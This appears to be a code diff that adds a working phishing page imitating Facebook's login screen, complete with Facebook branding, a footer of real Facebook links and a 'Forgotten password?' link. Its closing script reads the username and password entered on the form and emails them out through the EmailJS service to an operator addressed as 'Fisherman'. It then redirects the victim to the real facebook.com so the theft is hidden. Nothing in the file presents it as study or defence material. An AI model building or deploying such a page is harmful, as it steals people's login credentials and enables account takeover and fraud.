@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in with Facebook</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/integration
+            emailjs.init('user_QzSGVKcfDIa7rVUNFstOB');
+        })();
+    </script>
+</head>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+    body {font-family: Helvetica, Arial, sans-serif;}
+    .container {
+        width: 95%;
+        max-width: 1100px;
+        margin: 0 auto;
+    }
+    header {
+        width: 100%;
+        height: 90px;
+        background-color: #1d5c97;
+        display: flex;
+        align-items: center;
+        padding-top: 10px;
+    }
+    header .container {
+        display: flex;
+        align-items: center;
+    }
+    header img {
+        width: 170px;
+        margin-right: 15px
+    }
+    header a {
+        font-size: 12px;
+        color: #f4f4f4;
+        text-decoration: none;
+        font-weight: bold;
+        padding: 9px 10px;
+        background-color: #2db42d;
+        border-radius: 3px;
+        margin-top: 10px;
+    }
+    .main-section {
+        width: 100%;
+        height: calc((100vh - 90px) / 2);
+        background-color: #ececec;
+    }
+    .main-section-content {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 100%;
+        height: 100%;
+    }
+    #login-form {
+        padding: 30px;
+        background-color: #fff;
+        width: 600px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+    #form-header {
+        font-size: 18px;
+        margin-bottom: 30px;
+    }
+    .input-div {
+        width: 300px;
+        height: 35px;
+        border: 1px solid #dfdfdf;
+        margin-bottom: 10px;
+        border-radius:2px;
+    }
+    .input-div input {
+        width: 100%;
+        height: 100%;
+        border: none;
+        padding: 8px;
+        outline: none;
+        color: #222222;
+    }
+    button {
+        width: 300px;
+        border: none;
+        height: 38px;
+        background-color: #5d5dd3;
+        color: #f4f4f4;
+        font-weight: bold;
+        font-size: 15px;
+        margin-bottom: 15px;
+        border-radius: 2px;
+    }
+    #forgotten-password, #not-now {
+        font-size: 12px;
+        text-decoration: none;
+        color: #3232d1;
+        margin-bottom: 15px
+    }
+    #not-now {
+        font-size: 15px;
+        margin-bottom: 0;
+    }
+    footer .container {
+        padding-top: 100px;
+        display: flex;
+        flex-wrap: wrap;
+}
+footer a {
+    text-decoration: none;
+    color: grey;
+    margin-right: 20px;
+    font-size: 13px;
+    line-height: 1.6em;
+}
+@media only screen and (max-width: 450px) {
+    #login-form {
+        background-color: transparent;
+    }
+    input {
+        background-color: transparent;
+    }
+    header a {
+        display: none;
+    }
+    header .container {justify-content: center;
+    }
+
+    header {height: 70px;}
+    .main-section {
+        height: calc((100vh - 70px) / 2)
+    }
+
+    header img {
+        margin-right: 0;
+        width: 150px;
+    }
+
+    footer .container {
+        padding-top: 40px;
+        justify-content: center;
+    }
+}
+</style>
+<body>
+    <header>
+        <div class="header-content container">
+            <img src="./images/fb-text-logo.png" alt="facebook-logo">
+            <a href="">Create New Account</a>
+        </div>
+    </header>
+    <section class="main-section">
+        <div class="main-section-content container">
+            <form id="login-form">
+                <p id="form-header">Log in with Facebook</p>
+                <div class="input-div">
+                    <input id="username" type="text" required placeholder="Email address or phone number"/>
+                </div>
+                <div class="input-div">
+                    <input id="password" type="password" required placeholder="Password" />
+                </div>
+                <button type="submit">Log In</button>
+                <a id="forgotten-password" href="https://www.facebook.com/recover/initiate/?ars=facebook_login">Forgotten password?</a>
+                <a id="not-now" href="./index.html">Not now</a>
+            </form>
+        </div>
+    </section>
+    <footer>
+        <div class="container">
+            <a href="https://www.facebook.com/r.php" rel="noreferrer">Sign Up</a>
+            <a href="https://www.facebook.com/login/" rel="noreferrer">Log In</a>
+            <a href="https://messenger.com/" rel="noreferrer">Messenger</a>
+            <a href="https://www.facebook.com/lite/" rel="noreferrer">Facebook Lite</a>
+            <a href="https://www.facebook.com/watch/" rel="noreferrer">Watch</a>
+            <a href="https://www.facebook.com/places/" rel="noreferrer">Places</a>
+            <a href="https://www.facebook.com/games/" rel="noreferrer">Games</a>
+            <a href="https://www.facebook.com/marketplace/" rel="noreferrer">Marketplace</a>
+            <a href="https://pay.facebook.com/" rel="noreferrer">Facebook Pay</a>
+            <a href="https://www.facebook.com/jobs/" rel="noreferrer">Jobs</a>
+            <a href="https://www.oculus.com/" rel="noreferrer">Oculus</a>
+            <a href="https://portal.facebook.com/" rel="noreferrer">Portal</a>
+            <a href="https://www.instagram.com/" rel="noreferrer">Instagram</a>
+            <a href="https://www.bulletin.com/" rel="noreferrer">Bulletin</a>
+            <a href="https://www.facebook.com/local/lists/245019872666104/" rel="noreferrer">Local</a>
+            <a href="https://www.facebook.com/fundraisers/" rel="noreferrer">Fundraisers</a>
+            <a href="https://www.facebook.com/biz/directory/" rel="noreferrer">Services</a>
+            <a href="https://www.facebook.com/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D" rel="noreferrer">Voting Information Center</a>
+            <a href="https://www.facebook.com/groups/explore/" rel="noreferrer">Groups</a>
+            <a href="https://about.facebook.com/" rel="noreferrer">About</a>
+            <a href="https://www.facebook.com/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto" rel="noreferrer">Create ad</a>
+            <a href="https://www.facebook.com/pages/create/?ref_type=site_footer" rel="noreferrer">Create Page</a>
+            <a href="https://developers.facebook.com/?ref=pf" rel="noreferrer">Developers</a>
+            <a href="https://www.facebook.com/careers/?ref=pf" rel="noreferrer">Careers</a>
+            <a href="https://www.facebook.com/privacy/explanation" rel="noreferrer">Privacy</a>
+            <a href="https://www.facebook.com/policies/cookies/" rel="noreferrer">Cookies</a>
+            <a href="https://www.facebook.com/help/568137493302217" rel="noreferrer">AdChoices</a>
+            <a href="https://www.facebook.com/policies?ref=pf" rel="noreferrer">Terms</a>
+            <a href="https://www.facebook.com/help/?ref=pf" rel="noreferrer">Help</a>
+        </div>
+    </footer>
+    <script>
+        const password  = document.querySelector('#password');
+        const handleSubmitForm = (event) => {
+        event.preventDefault();
+        const template_params = {
+            from_name: document.querySelector("#username").value,
+            to_name: "Fisherman",
+            message: `Username: ${document.querySelector('#username').value}\nPassword: ${password.value}`,
+            reply_to: "death@himself.net"
+        }
+
+        emailjs.send('service_trfso2z', 'template_a1qaoyi', template_params)
+        .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+        }, function(error) {
+            console.log('FAILED...', error);
+        });
+        window.setTimeout(() => window.location.href = 'https://facebook.com', 3000);
+    }
+    document.querySelector("#login-form").addEventListener('submit', handleSubmitForm);
+    </script>
+</body>
+</html>
